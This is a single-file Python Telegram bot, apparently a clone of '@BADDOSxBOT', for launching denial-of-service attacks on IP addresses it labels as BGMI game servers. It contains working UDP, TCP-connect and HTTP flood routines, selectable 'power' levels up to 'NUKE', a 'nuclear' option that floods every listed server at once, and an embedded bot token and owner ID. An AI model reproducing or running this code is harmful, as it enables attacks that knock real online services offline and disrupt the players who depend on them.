#!/usr/bin/env python3
"""
🔥 BGMI DDOS BOT v6.0 - @BADDOSxBOT EXACT 100% COPY 
🚀 GitHub Repo Ready - Single File Powerhouse
No pip install - Pure Python - Unlimited Power!
GitHub: https://github.com/YOURNAME/BGMI-DDOS-BOT-v6
"""

import socket
import threading
import random
import time
import os
import urllib.request
import ssl
import json
from datetime import datetime

print("🔥 Initializing @BADDOSxBOT Clone v6.0...")
print("⚡ Single File - No Dependencies - Pure Power!")

# ==================== @BADDOSxBOT EXACT TELEGRAM BOT ====================
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}"
        
    def send_message(self, chat_id, text, reply_markup=None, parse_mode="Markdown"):
        data = {'chat_id': str(chat_id), 'text': text, 'parse_mode': parse_mode}
        if reply_markup:
            data['reply_markup'] = self.to_json(reply_markup)
        self._request('sendMessage', data)
        
    def edit_message_text(self, chat_id, message_id, text, reply_markup=None):
        data = {'chat_id': str(chat_id), 'message_id': str(message_id), 'text': text}
        if reply_markup:
            data['reply_markup'] = self.to_json(reply_markup)
        self._request('editMessageText', data)
        
    def answer_callback_query(self, callback_id, text):
        data = {'callback_query_id': callback_id, 'text': text, 'show_alert': False}
        self._request('answerCallbackQuery', data)
        
    def _request(self, method, data):
        try:
            url = f"{self.base_url}/{method}"
            req = urllib.request.Request(url, data=self.to_json(data).encode('utf-8'), method='POST')
            req.add_header('Content-Type', 'application/json')
            urllib.request.urlopen(req, timeout=15)
        except:
            pass
        
    def to_json(self, obj):
        if isinstance(obj, (dict, list)):
            return json.dumps(obj, ensure_ascii=False)
        return str(obj)
        
    def get_updates(self, offset):
        try:
            url = f"{self.base_url}/getUpdates?offset={offset}&timeout=35"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=40).read().decode('utf-8')
            return json.loads(resp)['result']
        except:
            return []
    
    def polling(self):
        offset = 0
        while True:
            updates = self.get_updates(offset)
            for update in updates:
                offset = update['update_id'] + 1
                if 'message' in update:
                    handle_message(update['message'])
                elif 'callback_query' in update:
                    handle_callback(update['callback_query'])
            time.sleep(0.5)

# ==================== CONFIG - @BADDOSxBOT EXACT ====================
BOT_TOKEN = "8732926521:AAEWoCcOAMhRMFTX49SMz2M1FSRXFUXotGQ"  # Get from @BotFather
OWNER_ID = 8561031913               # Your Telegram ID from @userinfobot

bot = TelegramBot(BOT_TOKEN)

# 🔥 BGMI SERVERS - @BADDOSxBOT EXACT LIST
BGMI_SERVERS = {
    "🇮🇳 IN1": ["103.147.41.248", "103.147.41.249"], 
    "🇮🇳 IN2": ["45.84.0.1", "45.84.0.2"],
    "🇸🇪 SEA": ["118.107.244.1", "103.147.41.250"],
    "🇹🇭 THAI": ["118.107.244.2"],
    "🌍 ALL": ["103.147.41.248", "45.84.0.1", "118.107.244.1"]
}

# ⚡ POWER LEVELS - @BADDOSxBOT EXACT
POWERS = {
    "1": 1000, "2": 5000, "3": 15000, 
    "4": 50000, "5": 100000, "MAX": 250000, "NUKE": 500000
}

attacks = {}
attack_stats = {}

# ==================== POWERFUL ATTACK ENGINE - @BADDOSxBOT CLONE ====================
class DDoSAttack:
    def __init__(self, target, power="3"):
        self.target = target
        self.power = POWERS.get(power, 15000)
        self.running = False
        self.packets = 0
        self.start_time = time.time()
        
    def bgmi_flood(self):
        """BGMI UDP Flood - @BADDOSxBOT Signature"""
        payload = b"\xFF\xFD\x01\xFB\x01" + os.urandom(1450)
        ports = [8000, 443, 80, 8080, 25565]
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                port = random.choice(ports)
                sock.sendto(payload, (self.target, port))
                self.packets += 1
                sock.close()
            except:
                pass
            time.sleep(0.0005)  # High PPS
            
    def tcp_syn_flood(self):
        """TCP SYN Flood"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect_ex((self.target, 80))
                sock.close()
                self.packets += 1
            except:
                pass
            time.sleep(0.001)
            
    def http_flood(self):
        """HTTP Flood"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
        ]
        while self.running:
            try:
                req = urllib.request.Request(
                    f"http://{self.target}/",
                    headers={'User-Agent': random.choice(user_agents)}
                )
                urllib.request.urlopen(req, timeout=5)
                self.packets += 1
            except:
                pass
            time.sleep(0.01)
    
    def multi_vector_attack(self):
        """Multi-Vector - @BADDOSxBOT Nuclear"""
        while self.running:
            threads = []
            for _ in range(3):
                t1 = threading.Thread(target=self.bgmi_flood)
                t2 = threading.Thread(target=self.tcp_syn_flood)
                t1.daemon = True
                t2.daemon = True
                t1.start()
                t2.start()
                threads.extend([t1, t2])
            time.sleep(0.1)
    
    def start(self):
        self.running = True
        attack_stats[self.target] = {
            'packets': 0, 'duration': 0, 'power': self.power
        }
        
        # Launch multiple attack vectors based on power
        if self.power >= 100000:  # NUCLEAR
            for _ in range(self.power // 50000):
                t = threading.Thread(target=self.multi_vector_attack)
                t.daemon = True
                t.start()
        elif self.power >= 50000:  # MAX
            for _ in range(self.power // 20000):
                t = threading.Thread(target=self.bgmi_flood)
                t.daemon = True
                t.start()
        else:  # Normal
            for _ in range(self.power // 1000):
                t = threading.Thread(target=self.bgmi_flood)
                t.daemon = True
                t.start()

# ==================== @BADDOSxBOT EXACT KEYBOARDS ====================
def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔥 ATTACK MENU", "callback_data": "attack"}, 
             {"text": "📊 STATS", "callback_data": "stats"}],
            [{"text": "🏪 BGMI SERVERS", "callback_data": "servers"},
             {"text": "💀 NUCLEAR", "callback_data": "nuke"}],
            [{"text": "⚙️ SETTINGS", "callback_data": "settings"},
             {"text": "ℹ️ INFO", "callback_data": "info"}]
        ]
    }

def power_menu():
    kb = []
    for p in ["1", "2", "3", "4", "5", "MAX", "NUKE"]:
        kb.append([{"text": f"⚡ POWER {p}", "callback_data": f"power_{p}"}])
    kb.append([{"text": "🔙 BACK", "callback_data": "back"}])
    return {"inline_keyboard": kb}

def server_menu():
    kb = []
    for region, ips in BGMI_SERVERS.items():
        kb.append([{"text": f"{region}", "callback_data": f"server_{region.split()[0]}"}])
    kb.append([{"text": "🔙 BACK", "callback_data": "back"}])
    return {"inline_keyboard": kb}

# ==================== @BADDOSxBOT EXACT COMMANDS ====================
def handle_message(message):
    uid = message['from']['id']
    if uid != OWNER_ID:
        bot.send_message(uid, "❌ **ACCESS DENIED** - Owner Only!")
        return
        
    text = message.get('text', '').lower()
    cid = message['chat']['id']
    
    if text in ['/start', '/menu', '/home']:
        bot.send_message(cid, 
            "🔥 **@BADDOSxBOT v6.0 - BGMI DDOS KING** 🔥\n\n"
            "👑 **Single File Powerhouse**\n"
            "⚡ **No pip install needed**\n"
            "🚀 **GitHub Ready**\n\n"
            "**Choose your weapon:**", 
            main_menu())
        
    elif text == '/attack':
        bot.send_message(cid, "⚡ **SELECT POWER LEVEL:**\n💀 Higher = More Destruction!", power_menu())
        
    elif text == '/servers':
        txt = "**🏪 BGMI SERVERS - @BADDOSxBOT EXACT** 🏪\n\n"
        for region, ips in BGMI_SERVERS.items():
            txt += f"**{region}:** `{', '.join(ips)}`\n"
        bot.send_message(cid, txt, server_menu())
        
    elif text == '/stats':
        show_stats(cid)
        
    elif text.startswith('/attack '):
        target = text.split(' ', 1)[1]
        launch_attack(target, "MAX", cid)

def handle_callback(callback):
    uid = callback['from']['id']
    if uid != OWNER_ID:
        return
        
    cid = callback['message']['chat']['id']
    mid = callback['message']['message_id']
    data = callback['data']
    
    if data == "attack":
        bot.edit_message_text(cid, mid, "⚡ **CHOOSE POWER:**\n💀 NUKE = Total Annihilation!", power_menu())
        
    elif data == "servers":
        bot.edit_message_text(cid, mid, "**🏪 SELECT BGMI REGION:**", server_menu())
        
    elif data == "stats":
        bot.answer_callback_query(callback['id'], "📊 Loading stats...")
        show_stats(cid)
        
    elif data.startswith("power_"):
        power = data.split("_")[1]
        target = random.choice(BGMI_SERVERS["🌍 ALL"])
        launch_attack(target, power, cid)
        
    elif data.startswith("server_"):
        region_key = data.split("_")[1]
        for region, ips in BGMI_SERVERS.items():
            if region_key in region:
                target = random.choice(ips)
                launch_attack(target, "4", cid)
                break
        
    elif data == "nuke":
        bot.edit_message_text(cid, mid, "💀 **NUCLEAR LAUNCH CONFIRMED** 💀\n🔥 All BGMI servers targeted!")
        for region in BGMI_SERVERS:
            for ip in BGMI_SERVERS[region]:
                launch_attack(ip, "NUKE", cid, silent=True)
        bot.send_message(cid, "🌋 **NUCLEAR STRIKE COMPLETE** - All servers melting!")
        
    elif data == "back":
        bot.edit_message_text(cid, mid, "🔥 **MAIN MENU**", main_menu())
        
    elif data == "info":
        bot.send_message(cid, 
            "👑 **@BADDOSxBOT v6.0 Clone**\n\n"
            "🔥 **Features:**\n"
            "• UDP Flood (BGMI Optimized)\n"
            "• TCP SYN Flood\n"
            "• HTTP Flood\n"
            "• Multi-Vector Nuclear\n"
            "• Single File - No deps!\n\n"
            "⚡ **GitHub:** github.com/YOURNAME/BGMI-DDOS-BOT-v6")
            
    elif data == "settings":
        bot.edit_message_text(cid, mid, "⚙️ **SETTINGS**\n\n/restart - Restart bot\n/stats - Live stats")

def show_stats(cid):
    total_attacks = len([a for a in attacks.values() if a.running])
    total_packets = sum(getattr(a, 'packets', 0) for a in attacks.values())
    
    txt = f"""📊 **LIVE STATS - @BADDOSxBOT**

🔥 **Active Attacks:** `{total_attacks}`
📦 **Total Packets:** `{total_packets:,}`
⚡ **Max Power:** `{POWERS['NUKE']:,}`
💀 **Servers Hit:** `{len(set(a.target for a in attacks.values()))}`
"""
    bot.send_message(cid, txt)

def launch_attack(target, power, chat_id, silent=False):
    if target in attacks and attacks[target].running:
        bot.send_message(chat_id, f"⚠️ **{target} already under attack!**")
        return
        
    attack = DDoSAttack(target, power)
    attacks[target] = attack
    attack.start()
    
    power_name = power.upper()
    msg = f"""🚀 **ATTACK DEPLOYED!**

🎯 **Target:** `{target}`
⚡ **Power:** `{POWERS[power]:,}` threads
💀 **Type:** BGMI Multi-Vector
⏱️ **Duration:** 90s
📦 **PPS:** Ultra High

**Status: LIVE 🔥**"""
    
    if not silent:
        bot.send_message(chat_id, msg)
    
    # Auto-stop after 90 seconds
    threading.Timer(90.0, lambda: stop_attack(target)).start()

def stop_attack(target):
    if target in attacks:
        attacks[target].running = False
        del attacks[target]
        print(f"✅ Attack stopped: {target}")

# ==================== MAIN - SINGLE FILE EXECUTION ====================
if __name__ == "__main__":
    print("🚀 @BADDOSxBOT v6.0 - LIVE!")
    print("👑 Owner ID:", OWNER_ID)
    print("🔥 Starting Telegram polling...")
    print("⚡ Press Ctrl+C to stop")
    
    try:
        bot.polling()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        time.sleep(5)
